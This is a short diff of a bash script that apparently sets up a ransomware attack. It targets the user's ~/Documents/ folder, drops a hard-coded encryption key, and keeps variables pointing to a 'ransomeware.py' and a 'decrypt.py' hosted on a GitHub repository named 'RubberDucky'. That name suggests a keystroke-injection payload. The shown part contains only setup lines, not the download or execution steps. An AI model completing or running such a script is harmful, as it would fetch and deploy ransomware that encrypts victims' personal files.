@@ -1,7 +1,6 @@
 #!/bin/bash
 curloc=`pwd`
 targetPath=~/Documents/
-key=uV2N981xqbXCHC8Z44qIJAgIwDQY9GLpNLF15BuHHhs=
 source="https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/ransomeware.py"
 source2="https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/decrypt.py"
 
